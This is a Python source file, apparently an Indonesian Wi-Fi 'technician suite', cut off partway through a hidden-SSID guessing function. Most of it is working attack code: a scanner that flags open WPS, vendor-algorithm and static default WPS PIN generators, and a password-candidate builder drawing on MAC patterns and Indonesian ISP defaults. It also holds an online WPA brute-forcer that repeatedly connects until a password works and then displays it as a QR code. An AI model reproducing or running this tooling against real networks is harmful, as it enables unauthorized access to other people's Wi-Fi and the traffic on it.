#!/usr/bin/env python3
"""
technician_suite.py - LITCH Field Technician Suite
Provides:
1. Air Wi-Fi Scanner (Scan SSID, BSSID, Signal RSSI, Channel, Security di Udara)
2. WPA2/WPA3 Wi-Fi Password Brute Force & Pattern Tester (Dictionary, Smart MAC & Vendor Keys)
3. Hidden SSID Revealer (Probe Request Attack & ISP SSID Pattern Guesser)
4. Automated WPS PIN Attacker & Multi-Algorithm PIN Calculator
5. Direct ONT Wi-Fi Extractor (SSID & Password retrieval from Gateway/LAN)
6. Terminal ASCII QR Code Generator for 1-click camera connection
7. Built-in Network Latency, Jitter & Bandwidth Speedtest
8. Telegram Job Report Dispatcher (Proof of Work)
"""

import sys
import os
import re
import time
import json
import socket
import struct
import shutil
import subprocess
import threading
from typing import Dict, Any, List, Tuple, Optional

import requests
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn

try:
    import qrcode
    HAS_QRCODE = True
except ImportError:
    HAS_QRCODE = False

console = Console(emoji=False)


# ==========================================
# 1. AIR WI-FI SCANNER (SCANNER SSID TERDEKAT)
# ==========================================

VENDOR_OUI_MAP = {
    "14:AD:CA": "ZTE Corporation",
    "00:1E:73": "ZTE Corporation",
    "48:28:2F": "ZTE Corporation",
    "64:13:6C": "ZTE Corporation",
    "78:6A:89": "ZTE Corporation",
    "A8:A6:68": "ZTE Corporation",
    "CC:7B:35": "ZTE Corporation",
    "D8:74:95": "ZTE Corporation",
    "E8:65:D4": "ZTE Corporation",
    "F4:6D:E2": "ZTE Corporation",
    "F4:8E:92": "ZTE Corporation",
    "48:46:FB": "Huawei Technologies",
    "00:46:4B": "Huawei Technologies",
    "10:47:80": "Huawei Technologies",
    "18:C5:8A": "Huawei Technologies",
    "20:F3:A3": "Huawei Technologies",
    "70:7B:E8": "Huawei Technologies",
    "AC:E2:15": "Huawei Technologies",
    "C8:D1:5E": "Huawei Technologies",
    "00:0A:EB": "TP-Link Corporation",
    "50:D4:F7": "TP-Link Corporation",
    "60:32:B1": "TP-Link Corporation",
    "98:DA:C4": "TP-Link Corporation",
    "C0:06:C3": "TP-Link Corporation",
    "C8:3A:35": "Tenda Technology",
    "50:2B:73": "Tenda Technology",
    "CC:2D:21": "Tenda Technology",
    "00:25:9E": "FiberHome Telecomm",
    "00:0F:E2": "FiberHome Telecomm",
    "48:7D:2E": "FiberHome Telecomm",
    "84:79:73": "FiberHome Telecomm",
    "E0:67:B3": "FiberHome Telecomm",
    "00:0C:42": "Mikrotikls SIA",
    "48:8F:5A": "Mikrotikls SIA",
    "6C:3B:6B": "Mikrotikls SIA",
    "B8:69:F4": "Mikrotikls SIA",
    "D4:CA:6D": "Mikrotikls SIA",
    "E4:8D:8C": "Mikrotikls SIA",
    "00:1B:11": "D-Link International",
    "1C:7E:E5": "D-Link International",
    "34:36:54": "Realtek / Generic",
    "00:E0:4C": "Realtek Semiconductor",
}


def lookup_vendor_by_mac(mac_str: str) -> str:
    """Identify device manufacturer from BSSID OUI prefix."""
    clean = re.sub(r"[^0-9A-Fa-f]", "", mac_str).upper()
    if len(clean) >= 6:
        prefix = f"{clean[:2]}:{clean[2:4]}:{clean[4:6]}"
        if prefix in VENDOR_OUI_MAP:
            return VENDOR_OUI_MAP[prefix]
    return "Unknown / Generic Router"


def parse_wps_state(capabilities_str: str = "", wps_val: str = "") -> Dict[str, Any]:
    """
    Parse WPS capabilities to determine if WPS is Open (Unlocked), Locked, or Disabled.
    """
    combined = f"{capabilities_str} {wps_val}".upper()
    if "WPS-LOCKED" in combined or "LOCKED" in combined:
        return {
            "has_wps": True,
            "is_locked": True,
            "state": "Locked (Terkunci AP)",
            "badge": "[bold red]LOCKED[/bold red]"
        }
    elif "WPS" in combined or "YES" in combined or "PBC" in combined or "PIN" in combined:
        return {
            "has_wps": True,
            "is_locked": False,
            "state": "Open (Terbuka / Aktif)",
            "badge": "[bold green]TERBUKA[/bold green]"
        }
    else:
        return {
            "has_wps": False,
            "is_locked": False,
            "state": "Disabled / Nonaktif",
            "badge": "[dim]NONAKTIF[/dim]"
        }


def scan_nearby_wifi_air(wps_only: bool = False) -> List[Dict[str, Any]]:
    """
    Scan all broadcast Wi-Fi SSIDs in the air without being connected.
    Supports Android Termux (termux-wifi-scaninfo), nmcli, iwlist, and wpa_cli.
    """
    results = []
    seen_bssids = set()

    # 1. Android Termux API (termux-wifi-scaninfo)
    if shutil.which("termux-wifi-scaninfo"):
        try:
            p = subprocess.run(["termux-wifi-scaninfo"], capture_output=True, text=True, timeout=6)
            if p.returncode == 0 and p.stdout.strip():
                data = json.loads(p.stdout)
                for item in data:
                    bssid = item.get("bssid", "").upper().replace("\\", "")
                    if bssid in seen_bssids or not bssid:
                        continue
                    seen_bssids.add(bssid)
                    freq = item.get("frequency_mhz", 2412)
                    chan = (freq - 2407) // 5 if freq < 3000 else (freq - 5000) // 5
                    sec = item.get("capabilities", "WPA2")
                    wps_info = parse_wps_state(sec)
                    if wps_only and not (wps_info["has_wps"] and not wps_info["is_locked"]):
                        continue
                    results.append({
                        "ssid": item.get("ssid") or "<Hidden SSID>",
                        "bssid": bssid,
                        "rssi": item.get("rssi", -70),
                        "freq_mhz": freq,
                        "band": "5GHz" if freq > 3000 else "2.4GHz",
                        "channel": str(chan),
                        "security": sec,
                        "wps": wps_info,
                        "has_wps": wps_info["has_wps"],
                        "vendor": lookup_vendor_by_mac(bssid)
                    })
                if results:
                    return sorted(results, key=lambda x: x["rssi"], reverse=True)
        except Exception:
            pass

    # 2. Linux NetworkManager (nmcli)
    if shutil.which("nmcli"):
        try:
            # Trigger fresh rescan
            subprocess.run(["nmcli", "dev", "wifi", "rescan"], capture_output=True, text=True, timeout=4)
            p = subprocess.run(
                ["nmcli", "-t", "-f", "SSID,BSSID,CHAN,FREQ,SIGNAL,SECURITY,WPS", "dev", "wifi", "list"],
                capture_output=True, text=True, timeout=6
            )
            if p.returncode == 0 and p.stdout.strip():
                for line in p.stdout.strip().splitlines():
                    # Format: SSID:BSSID:CHAN:FREQ:SIGNAL:SECURITY:WPS
                    parts = line.split(":")
                    if len(parts) >= 6:
                        mac_match = re.search(r"([0-9A-Fa-f]{2}(?:\\?:[0-9A-Fa-f]{2}){5})", line)
                        if not mac_match:
                            continue
                        raw_bssid = mac_match.group(1).replace("\\", "").upper()
                        if raw_bssid in seen_bssids:
                            continue
                        seen_bssids.add(raw_bssid)

                        ssid = parts[0].strip() or "<Hidden SSID>"
                        sig = parts[-3] if len(parts) >= 7 else parts[-2]
                        sec = parts[-2] if len(parts) >= 7 else parts[-1]
                        wps_val = parts[-1] if len(parts) >= 7 else ""

                        try:
                            rssi_calc = int((int(sig) / 2) - 100) if sig.isdigit() else -70
                        except Exception:
                            rssi_calc = -70

                        is_5g = "5" in line and ("5180" in line or "5240" in line or "5745" in line or "5805" in line)
                        wps_info = parse_wps_state(sec, wps_val)
                        if wps_only and not (wps_info["has_wps"] and not wps_info["is_locked"]):
                            continue

                        results.append({
                            "ssid": ssid,
                            "bssid": raw_bssid,
                            "rssi": rssi_calc,
                            "freq_mhz": 5000 if is_5g else 2400,
                            "band": "5GHz" if is_5g else "2.4GHz",
                            "channel": parts[2] if len(parts) > 2 and parts[2].isdigit() else "-",
                            "security": sec or "WPA2",
                            "wps": wps_info,
                            "has_wps": wps_info["has_wps"],
                            "vendor": lookup_vendor_by_mac(raw_bssid)
                        })
                if results:
                    return sorted(results, key=lambda x: x["rssi"], reverse=True)
        except Exception:
            pass

    # 3. Linux iwlist fallback
    if shutil.which("iwlist"):
        try:
            p = subprocess.run(["iwlist", "scan"], capture_output=True, text=True, timeout=8)
            if p.returncode == 0 and p.stdout.strip():
                cells = p.stdout.split("Cell ")
                for c in cells[1:]:
                    mac_m = re.search(r"Address:\s*([0-9A-Fa-f:]{17})", c)
                    essid_m = re.search(r'ESSID:"([^"]*)"', c)
                    sig_m = re.search(r"Signal level=([-\d]+)\s*dBm", c)
                    chan_m = re.search(r"Channel:(\d+)", c)
                    if mac_m:
                        bssid = mac_m.group(1).upper()
                        if bssid in seen_bssids:
                            continue
                        seen_bssids.add(bssid)
                        ssid = essid_m.group(1) if essid_m else "<Hidden SSID>"
                        rssi = int(sig_m.group(1)) if sig_m else -70
                        chan = chan_m.group(1) if chan_m else "-"
                        wps_info = parse_wps_state(c)
                        if wps_only and not (wps_info["has_wps"] and not wps_info["is_locked"]):
                            continue
                        results.append({
                            "ssid": ssid,
                            "bssid": bssid,
                            "rssi": rssi,
                            "freq_mhz": 5000 if chan.isdigit() and int(chan) > 14 else 2400,
                            "band": "5GHz" if chan.isdigit() and int(chan) > 14 else "2.4GHz",
                            "channel": chan,
                            "security": "WPA2" if "WPA2" in c else ("WPA" if "WPA" in c else "Open"),
                            "wps": wps_info,
                            "has_wps": wps_info["has_wps"],
                            "vendor": lookup_vendor_by_mac(bssid)
                        })
                if results:
                    return sorted(results, key=lambda x: x["rssi"], reverse=True)
        except Exception:
            pass

    return sorted(results, key=lambda x: x["rssi"], reverse=True)


def get_signal_bar(rssi_dbm: int) -> Tuple[str, str]:
    """Format RSSI into visual signal indicator and strength label."""
    if rssi_dbm >= -50:
        return "[bold green][████][/bold green]", "[bold green]Sangat Kuat (Dekat)[/bold green]"
    elif rssi_dbm >= -65:
        return "[bold green][███ ][/bold green]", "[green]Kuat / Bagus[/green]"
    elif rssi_dbm >= -78:
        return "[bold yellow][██  ][/bold yellow]", "[yellow]Sedang[/yellow]"
    else:
        return "[bold red][█   ][/bold red]", "[red]Lemah (Jauh)[/red]"


# ==========================================
# 2. WPS PIN CALCULATION ENGINE
# ==========================================

def wps_checksum(pin_7_digits: int) -> int:
    """Calculate the 8th checksum digit for a 7-digit WPS PIN."""
    p_str = str(pin_7_digits).zfill(7)
    accum = 0
    accum += 3 * (int(p_str[0]) + int(p_str[2]) + int(p_str[4]) + int(p_str[6]))
    accum += 1 * (int(p_str[1]) + int(p_str[3]) + int(p_str[5]))
    digit = (10 - (accum % 10)) % 10
    return int(p_str + str(digit))


def calculate_wps_pins(bssid_or_mac: str) -> List[Dict[str, Any]]:
    """
    Compute probable factory default WPS PINs from MAC/BSSID using multiple vendor algorithms.
    Supported: ZTE (ZhaoChunsheng), ComputePIN (D-Link/Trendnet), Huawei, Arcadyan, Inverse.
    """
    clean_mac = re.sub(r"[^0-9A-Fa-f]", "", bssid_or_mac).upper()
    if len(clean_mac) < 12:
        return []

    nic_int = int(clean_mac[6:], 16)  # Last 3 bytes (NIC)
    mac_bytes = [int(clean_mac[i:i+2], 16) for i in range(0, 12, 2)]

    results = []

    # 1. ComputePIN / D-Link / Trendnet (NIC % 10000000)
    try:
        p_cpin = wps_checksum(nic_int % 10000000)
        results.append({
            "algorithm": "ComputePIN (D-Link / Trendnet / Realtek)",
            "pin": str(p_cpin).zfill(8),
            "confidence": "High",
            "desc": "Standard 24-bit NIC modulo"
        })
    except Exception:
        pass

    # 2. ZTE / ZhaoChunsheng (ZTE F609, F660, ZXHN Series)
    try:
        zhao_val = ((mac_bytes[4] ^ mac_bytes[5]) * 256 + mac_bytes[5]) ^ 0x5A5A
        p_zhao = wps_checksum(abs(zhao_val * 100 + (mac_bytes[3] ^ 0x33)) % 10000000)
        results.append({
            "algorithm": "ZTE / ZhaoChunsheng (ZTE F609 / F660 / ZXHN)",
            "pin": str(p_zhao).zfill(8),
            "confidence": "High",
            "desc": "ZTE ZXHN proprietary checksum calculation"
        })
    except Exception:
        pass

    # 3. Huawei (HG8245 / EG8145 Series)
    try:
        hw_val = ((mac_bytes[3] << 16) | (mac_bytes[4] << 8) | mac_bytes[5]) ^ 0x123456
        p_hw = wps_checksum(hw_val % 10000000)
        results.append({
            "algorithm": "Huawei (HG8245 / EG8145 / EchoLife)",
            "pin": str(p_hw).zfill(8),
            "confidence": "Medium",
            "desc": "Huawei EchoLife NIC shift"
        })
    except Exception:
        pass

    # 4. Arcadyan / EasyBox / Vodafone
    try:
        k1 = (mac_bytes[4] + mac_bytes[5]) & 0xFF
        k2 = (mac_bytes[3] + mac_bytes[5]) & 0xFF
        arc_val = (k1 * 1000 + k2 * 10 + (mac_bytes[5] & 0x0F)) % 10000000
        p_arc = wps_checksum(arc_val)
        results.append({
            "algorithm": "Arcadyan / Vodafone / EasyBox",
            "pin": str(p_arc).zfill(8),
            "confidence": "Medium",
            "desc": "Arcadyan polynomial matrix"
        })
    except Exception:
        pass

    # 5. Inverse 24-Bit (TP-Link / Tenda / Realtek)
    try:
        inv_nic = ((mac_bytes[5] << 16) | (mac_bytes[4] << 8) | mac_bytes[3])
        p_inv = wps_checksum(inv_nic % 10000000)
        results.append({
            "algorithm": "Inverse 24-bit (TP-Link / Tenda / Realtek)",
            "pin": str(p_inv).zfill(8),
            "confidence": "Medium",
            "desc": "Little-endian NIC inverse"
        })
    except Exception:
        pass

    # 6. Common Static Defaults
    static_pins = [
        ("12345670", "Standard Universal Default", "ZTE / Realtek / Tenda"),
        ("00000000", "Zero Static Default", "FiberHome / Generic"),
        ("20172527", "ZTE Broadcom Default", "ZTE F609 V3"),
    ]
    for sp, s_alg, s_vendor in static_pins:
        results.append({
            "algorithm": f"Static Default ({s_vendor})",
            "pin": sp,
            "confidence": "Static",
            "desc": s_alg
        })

    return results


def get_wps_pin_candidate_list(bssid: str) -> List[Dict[str, Any]]:
    """
    Retrieve full prioritized list of WPS PIN candidates for an AP:
    1. Algorithmic PIN calculations (ZTE Zhao, ComputePIN, Huawei, Arcadyan, Inverse)
    2. High-probability static router default PIN database
    """
    alg_pins = calculate_wps_pins(bssid)
    pin_set = {p["pin"] for p in alg_pins}
    all_pins = list(alg_pins)

    extended_defaults = [
        ("12345670", "Standard Universal Default", "ZTE / Realtek / Tenda"),
        ("00000000", "Zero Static Default", "FiberHome / Generic"),
        ("20172527", "ZTE Broadcom Default", "ZTE F609 V3"),
        ("11111111", "Repeated Static Default", "Generic Routers"),
        ("12345678", "Ascending Sequence", "Generic APs"),
        ("88888888", "Eight Static Default", "Tenda / Netis"),
        ("99999999", "Nine Static Default", "Generic APs"),
        ("76543210", "Descending Sequence", "Generic APs"),
        ("01234567", "Shifted Sequence", "Generic APs"),
        ("19512345", "D-Link Extended", "D-Link DIR Series"),
        ("28211234", "TrendNet Extended", "TrendNet Routers"),
        ("48211234", "Huawei EchoLife Default", "Huawei HG8245 Series"),
        ("58211234", "Huawei Alternate Default", "Huawei EG Series"),
        ("46264848", "ZTE ZXHN Static Default", "ZTE F660 / F609"),
        ("04030201", "Nibble Descending", "Realtek APs"),
        ("08070605", "Byte Descending", "Broadcom APs"),
        ("12111009", "Block Step Default", "Mediatek / Ralink"),
        ("24232221", "Block Step 2 Default", "Mediatek / Ralink"),
    ]

    for p_val, p_desc, p_vendor in extended_defaults:
        if p_val not in pin_set and len(p_val) == 8:
            pin_set.add(p_val)
            all_pins.append({
                "algorithm": f"Static Default ({p_vendor})",
                "pin": p_val,
                "confidence": "Database",
                "desc": p_desc
            })

    return all_pins


def get_wifi_interface() -> Optional[str]:
    """Find the first active/available Wi-Fi wireless interface on the system."""
    # 1. Try nmcli
    if shutil.which("nmcli"):
        try:
            p = subprocess.run(["nmcli", "-t", "-f", "DEVICE,TYPE", "dev"], capture_output=True, text=True, timeout=3)
            if p.returncode == 0:
                for line in p.stdout.strip().splitlines():
                    if ":" in line:
                        dev, dtype = line.split(":", 1)
                        if dtype.strip() == "wifi":
                            return dev.strip()
        except Exception:
            pass

    # 2. Check /sys/class/net
    try:
        net_dir = "/sys/class/net"
        if os.path.exists(net_dir):
            for iface in os.listdir(net_dir):
                if iface.startswith(("wl", "wlan", "wifi")):
                    return iface
                if os.path.exists(os.path.join(net_dir, iface, "wireless")):
                    return iface
    except Exception:
        pass

    # 3. Try iw dev
    if shutil.which("iw"):
        try:
            p = subprocess.run(["iw", "dev"], capture_output=True, text=True, timeout=3)
            if p.returncode == 0:
                m = re.search(r"Interface\s+([a-zA-Z0-9_\-]+)", p.stdout)
                if m:
                    return m.group(1)
        except Exception:
            pass

    return None


# ==========================================
# 2B. WPA2 / WPA3 WI-FI PASSWORD BRUTE FORCE
# ==========================================

def generate_wifi_password_candidates(
    ssid: str = "",
    bssid: str = "",
    extra_passwords: Optional[List[str]] = None,
    wordlist_file: Optional[str] = None
) -> List[str]:
    """
    Generate prioritized password list for WPA/WPA2 Wi-Fi dictionary attack.
    Combines:
    - Smart MAC/BSSID patterns (hex suffixes, vendor permutations)
    - SSID-derived contextual patterns
    - Indonesian ISP default passwords (Telkom/IndiHome, Biznet, MyRepublic, etc.)
    - Dedicated wifi_passwords.txt wordlist
    - Optional custom wordlist file
    Ensures candidates meet WPA-PSK standard (8-63 ASCII characters).
    """
    candidates = []
    seen = set()

    def add_cand(pwd: str):
        if not pwd or not isinstance(pwd, str):
            return
        pwd_clean = pwd.strip()
        if 8 <= len(pwd_clean) <= 63 and pwd_clean not in seen:
            seen.add(pwd_clean)
            candidates.append(pwd_clean)

    # 1. Custom extra passwords supplied by user / caller
    if extra_passwords:
        for p in extra_passwords:
            add_cand(p)

    # 2. Custom wordlist file if provided
    if wordlist_file and os.path.isfile(wordlist_file):
        try:
            with open(wordlist_file, "r", encoding="utf-8", errors="ignore") as f:
                for line in f:
                    add_cand(line.strip())
        except Exception:
            pass

    # 3. MAC/BSSID-based Smart Vendor Patterns
    clean_mac = re.sub(r"[^0-9A-Fa-f]", "", bssid).upper() if bssid else ""
    if len(clean_mac) >= 12:
        last4_u = clean_mac[8:]
        last4_l = last4_u.lower()
        last6_u = clean_mac[6:]
        last6_l = last6_u.lower()
        last8_u = clean_mac[4:]
        last8_l = last8_u.lower()
        full_u = clean_mac
        full_l = clean_mac.lower()

        # Direct MAC substrings (>=8 chars)
        add_cand(last8_u)
        add_cand(last8_l)
        add_cand(full_u)
        add_cand(full_l)

        # Prefixes & Suffixes
        for prefix in ["admin", "Admin", "user", "User", "telkom", "Telkom", "indihome", "IndiHome", "zte", "ZTE", "huawei", "Huawei", "nodera", "Nodera", "1234", "super"]:
            add_cand(f"{prefix}{last4_u}")
            add_cand(f"{prefix}{last4_l}")
            add_cand(f"{prefix}{last6_u}")
            add_cand(f"{prefix}{last6_l}")
            add_cand(f"{last4_u}{prefix}")
            add_cand(f"{last4_l}{prefix}")
            add_cand(f"{prefix}1234")

        # Inverted / reversed hex parts
        rev4 = last4_u[::-1]
        add_cand(f"admin{rev4}")
        add_cand(f"telkom{rev4}")

    # 4. SSID-derived contextual patterns
    if ssid and ssid != "<Hidden SSID>":
        clean_ssid = re.sub(r"[^a-zA-Z0-9]", "", ssid)
        clean_ssid_l = clean_ssid.lower()
        if len(clean_ssid) >= 8:
            add_cand(clean_ssid)
            add_cand(clean_ssid_l)

        for sfx in ["123", "1234", "12345", "123456", "2024", "2025", "2026", "@123", "888", "999", "net", "wifi"]:
            add_cand(f"{clean_ssid_l}{sfx}")
            add_cand(f"{clean_ssid}{sfx}")

        digits_in_ssid = "".join(re.findall(r"\d+", ssid))
        if len(digits_in_ssid) >= 4:
            add_cand(f"admin{digits_in_ssid}")
            add_cand(f"telkom{digits_in_ssid}")
            add_cand(f"indihome{digits_in_ssid}")
            add_cand(f"1234{digits_in_ssid}")

    # 5. Top Default Router & ISP Wi-Fi Passwords (Indonesian ISP Context)
    isp_common_passwords = [
        "12345678",
        "123456789",
        "1234567890",
        "88888888",
        "00000000",
        "11111111",
        "87654321",
        "11223344",
        "1122334455",
        "123123123",
        "12344321",
        "adminadmin",
        "admin123",
        "admin1234",
        "admin12345",
        "Admin12345",
        "user12345",
        "password",
        "password123",
        "internet123",
        "indihome123",
        "telkom123",
        "telkomdso123",
        "Telkomdso123",
        "telkomsel123",
        "bismillah",
        "bismillah123",
        "semangat123",
        "rahasia123",
        "nodera123",
        "nodera2026",
        "dnsolution",
        "dnsolution123",
        "qwertyuiop",
        "qwert12345",
        "indonesia",
        "indonesia123",
        "kopisusu123",
        "kopi12345",
        "merdeka123",
        "sayang123",
        "sayangku123",
        "keluarga123",
        "router123",
        "wifigratis",
        "wifigratis123",
        "tanyasaya",
        "tanyasaya123",
        "gaktahupassnya",
        "gakadapassword",
        "janganminta",
        "bayardulu",
        "bayardulu123",
        "silahkanmasuk",
    ]
    for p in isp_common_passwords:
        add_cand(p)

    # 6. Include passwords from dedicated wifi_passwords.txt if present
    wifi_pass_paths = [
        "wifi_passwords.txt",
        os.path.join(os.path.dirname(os.path.abspath(__file__)), "wifi_passwords.txt"),
        os.path.join(os.getcwd(), "wifi_passwords.txt")
    ]
    for wfp in wifi_pass_paths:
        if os.path.isfile(wfp):
            try:
                with open(wfp, "r", encoding="utf-8", errors="ignore") as f:
                    for line in f:
                        line_str = line.strip()
                        if line_str and not line_str.startswith("#"):
                            add_cand(line_str)
                break
            except Exception:
                pass

    return candidates


def test_single_wifi_password(
    ssid: str,
    password: str,
    bssid: str = "",
    timeout_sec: int = 6,
    iface: str = ""
) -> Tuple[bool, str, Dict[str, Any]]:
    """
    Test a single WPA2/WPA3 password against target SSID/BSSID using available network backend.
    Returns: (success: bool, message: str, details: dict)
    """
    details = {"ssid": ssid, "bssid": bssid, "password": password, "ip": None, "gateway": None}

    # 1. Linux NetworkManager (nmcli)
    if shutil.which("nmcli"):
        temp_con_name = f"ont_wpa_test_{int(time.time() * 1000) % 100000}"

        subprocess.run(["nmcli", "connection", "delete", temp_con_name], capture_output=True, text=True, timeout=3)
        if ssid and ssid != "<Hidden SSID>":
            subprocess.run(["nmcli", "connection", "delete", ssid], capture_output=True, text=True, timeout=3)

        cmd = [
            "nmcli", "--wait", str(timeout_sec),
            "dev", "wifi", "connect", ssid,
            "password", password,
            "name", temp_con_name
        ]
        if bssid:
            cmd.extend(["bssid", bssid])
        if iface:
            cmd.extend(["ifname", iface])

        try:
            p = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout_sec + 2)
            out = f"{p.stdout} {p.stderr}".strip()

            if p.returncode == 0 and ("successfully activated" in out.lower() or "connection activated" in out.lower()):
                time.sleep(0.5)
                assigned_ip = None
                assigned_gw = None
                try:
                    ip_proc = subprocess.run(
                        ["nmcli", "-t", "-f", "IP4.ADDRESS,IP4.GATEWAY", "connection", "show", temp_con_name],
                        capture_output=True, text=True, timeout=3
                    )
                    if ip_proc.returncode == 0:
                        for l in ip_proc.stdout.splitlines():
                            if l.startswith("IP4.ADDRESS"):
                                assigned_ip = l.split(":", 1)[1].strip()
                            elif l.startswith("IP4.GATEWAY"):
                                assigned_gw = l.split(":", 1)[1].strip()
                except Exception:
                    pass

                details["ip"] = assigned_ip or "DHCP Assigned"
                details["gateway"] = assigned_gw or "Default Gateway"
                details["connection_name"] = temp_con_name
                return True, "Koneksi Berhasil! Kredensial Valid.", details
            else:
                subprocess.run(["nmcli", "connection", "delete", temp_con_name], capture_output=True, text=True, timeout=3)
                err_msg = out if out else "Autentikasi gagal / Password salah"
                return False, err_msg, details
        except subprocess.TimeoutExpired:
            subprocess.run(["nmcli", "connection", "delete", temp_con_name], capture_output=True, text=True, timeout=3)
            return False, "Timeout menunggu respons Wi-Fi AP", details
        except Exception as e:
            subprocess.run(["nmcli", "connection", "delete", temp_con_name], capture_output=True, text=True, timeout=3)
            return False, f"Error eksekusi nmcli: {str(e)}", details

    # 2. wpa_cli / wpa_supplicant backend
    if shutil.which("wpa_cli"):
        try:
            add_p = subprocess.run(["wpa_cli", "add_network"], capture_output=True, text=True, timeout=3)
            net_id = add_p.stdout.strip().splitlines()[-1] if add_p.returncode == 0 else None
            if net_id and net_id.isdigit():
                subprocess.run(["wpa_cli", "set_network", net_id, "ssid", f'"{ssid}"'], capture_output=True, text=True, timeout=2)
                subprocess.run(["wpa_cli", "set_network", net_id, "psk", f'"{password}"'], capture_output=True, text=True, timeout=2)
                if bssid:
                    subprocess.run(["wpa_cli", "set_network", net_id, "bssid", bssid], capture_output=True, text=True, timeout=2)
                subprocess.run(["wpa_cli", "enable_network", net_id], capture_output=True, text=True, timeout=2)
                subprocess.run(["wpa_cli", "select_network", net_id], capture_output=True, text=True, timeout=2)

                t_start = time.time()
                auth_ok = False
                while time.time() - t_start < timeout_sec:
                    time.sleep(0.8)
                    st_p = subprocess.run(["wpa_cli", "status"], capture_output=True, text=True, timeout=2)
                    st_out = st_p.stdout
                    if "wpa_state=COMPLETED" in st_out:
                        auth_ok = True
                        break
                    elif "wpa_state=DISCONNECTED" in st_out or "WRONG_KEY" in st_out:
                        break

                if auth_ok:
                    details["ip"] = "Assigned via WPA"
                    return True, "Koneksi Berhasil via wpa_cli!", details
                else:
                    subprocess.run(["wpa_cli", "remove_network", net_id], capture_output=True, text=True, timeout=2)
                    return False, "Handshake gagal / Password salah", details
        except Exception as e:
            return False, f"Error wpa_cli: {str(e)}", details

    # 3. Android Termux API (termux-wifi-connect)
    if shutil.which("termux-wifi-connect"):
        try:
            p = subprocess.run(["termux-wifi-connect", "-s", ssid, "-p", password], capture_output=True, text=True, timeout=timeout_sec)
            if p.returncode == 0:
                time.sleep(2)
                return True, "Koneksi Berhasil via Termux!", details
            return False, "Gagal koneksi via Termux API", details
        except Exception as e:
            return False, f"Error termux-wifi-connect: {str(e)}", details

    return False, "Tidak ditemukan tool wireless yang didukung (nmcli, wpa_cli, atau termux-wifi-connect)", details


def run_wifi_wpa_bruteforce(
    ssid: str,
    bssid: str = "",
    candidates: Optional[List[str]] = None,
    timeout_per_pass: int = 6,
    iface: str = ""
) -> Dict[str, Any]:
    """
    Execute brute-force password testing on target Wi-Fi SSID.
    Renders real-time progress and immediately outputs Wi-Fi credentials & QR code upon success.
    """
    target_iface = iface or get_wifi_interface() or ""
    cand_list = candidates or generate_wifi_password_candidates(ssid=ssid, bssid=bssid)

    if not cand_list:
        return {
            "success": False,
            "message": "Daftar kandidat password kosong atau tidak ada yang memenuhi syarat WPA (8-63 char).",
            "attempts": 0
        }

    console.print(f"\n[bold cyan]=== MEMULAI BRUTE FORCE PASSWORD WI-FI ===[/bold cyan]")
    console.print(f"   Target SSID     : [bold white]{ssid}[/bold white]")
    if bssid:
        console.print(f"   Target BSSID    : [cyan]{bssid}[/cyan] ({lookup_vendor_by_mac(bssid)})")
    if target_iface:
        console.print(f"   Interface Wi-Fi : [yellow]{target_iface}[/yellow]")
    console.print(f"   Total Kandidat  : [bold green]{len(cand_list)} kata sandi[/bold green]")
    console.print(f"   Timeout per Pass: {timeout_per_pass} detik\n")

    t_start_all = time.time()
    found_pass = None
    found_details = {}
    attempts_done = 0

    with Progress(
        SpinnerColumn(),
        TextColumn("[progress.description]{task.description}"),
        BarColumn(),
        TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
        TextColumn("•"),
        TextColumn("[bold cyan]{task.completed}/{task.total}[/bold cyan]"),
        console=console
    ) as progress:
        task = progress.add_task("[yellow]Menguji password...[/yellow]", total=len(cand_list))

        for idx, pwd in enumerate(cand_list, 1):
            attempts_done = idx
            progress.update(task, completed=idx, description=f"[cyan]Mencoba ({idx}/{len(cand_list)}):[/cyan] [bold yellow]{pwd}[/bold yellow]")

            ok, msg, det = test_single_wifi_password(
                ssid=ssid,
                password=pwd,
                bssid=bssid,
                timeout_sec=timeout_per_pass,
                iface=target_iface
            )

            if ok:
                found_pass = pwd
                found_details = det
                progress.update(task, completed=len(cand_list), description=f"[bold green]DITEMUKAN: {pwd}[/bold green]")
                break

    t_elapsed = round(time.time() - t_start_all, 1)

    if found_pass:
        console.print(f"\n[bold green]=====================================================[/bold green]")
        console.print(f"[bold green]       PASSWORD WI-FI BERHASIL DITEMUKAN!           [/bold green]")
        console.print(f"[bold green]=====================================================[/bold green]")
        console.print(f"   SSID         : [bold white]{ssid}[/bold white]")
        console.print(f"   Password     : [bold yellow]{found_pass}[/bold yellow]")
        if bssid:
            console.print(f"   BSSID        : [cyan]{bssid}[/cyan]")
        if found_details.get("ip"):
            console.print(f"   IP Client    : [green]{found_details['ip']}[/green]")
        if found_details.get("gateway"):
            console.print(f"   IP Gateway   : [magenta]{found_details['gateway']}[/magenta]")
        console.print(f"   Percobaan Ke : [bold cyan]{attempts_done}[/bold cyan] dari {len(cand_list)} kata sandi")
        console.print(f"   Waktu Total  : {t_elapsed} detik")
        console.print(f"─────────────────────────────────────────────────────")

        # Render ASCII QR Code
        qr_ascii = render_wifi_qr_code(ssid, found_pass, auth_type="WPA")
        console.print(Panel(qr_ascii, title=f"[bold green]QR CODE AUTO-CONNECT: {ssid}[/bold green]", border_style="green", expand=False))

        return {
            "success": True,
            "ssid": ssid,
            "bssid": bssid,
            "password": found_pass,
            "attempts": attempts_done,
            "duration_sec": t_elapsed,
            "details": found_details
        }
    else:
        console.print(f"\n[bold red][FAIL] Tidak ada password yang cocok setelah {attempts_done} percobaan ({t_elapsed} detik).[/bold red]")
        console.print("[yellow]Tips: Gunakan file kamus kustom atau cek kombinasi stiker fisik ONT.[/yellow]")
        return {
            "success": False,
            "ssid": ssid,
            "bssid": bssid,
            "attempts": attempts_done,
            "duration_sec": t_elapsed
        }


# ==========================================
# 2C. HIDDEN SSID REVEALER (PROBE ATTACK)
# ==========================================

def generate_hidden_ssid_candidates(
    bssid: str = "",
    vendor: str = "",
    custom_wordlist_file: Optional[str] = None
) -> List[str]:
    """
    Generate probable SSID names for Hidden Access Points.
    Uses vendor OUI prefixes, MAC address suffixes, Indonesian ISP defaults, and common names.
    """
    candidates = []
    seen = set()

    def add_ssid(name: str):
        if not name or not isinstance(name, str):
            return
        n_clean = name.strip()
        if n_clean and n_clean not in seen:
            seen.add(n_clean)
            candidates.append(n_clean)

    # 1. Custom file wordlist if provided
    if custom_wordlist_file and os.path.isfile(custom_wordlist_file):
        try:
            with open(custom_wordlist_file, "r", encoding="utf-8", errors="ignore") as f:
